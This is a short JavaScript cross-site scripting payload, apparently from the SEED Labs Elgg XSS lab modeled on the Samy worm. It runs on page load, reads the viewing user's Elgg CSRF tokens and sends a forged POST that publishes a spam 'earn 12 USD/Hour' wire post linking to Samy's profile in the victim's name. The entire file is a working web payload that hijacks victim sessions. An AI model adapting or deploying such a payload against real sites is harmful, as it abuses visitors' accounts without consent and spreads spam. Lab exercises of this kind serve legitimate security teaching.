window.onload = function () {
    var samyGuid = 47;
    // if the user is sammy himself, do nothing
    if (elgg.session.user.guid == samyGuid) {
        return;
    }

    //prepare payload
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    let link = "To earn 12 USD/Hour(!), visit now http:\/\/www.xsslabelgg.com\/profile\/samy"
    var body = "&body=" + link;

    var sendurl = "http://www.xsslabelgg.com/action/thewire/add";
    var content = ts + token + body;

    // send the request
    var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);

}
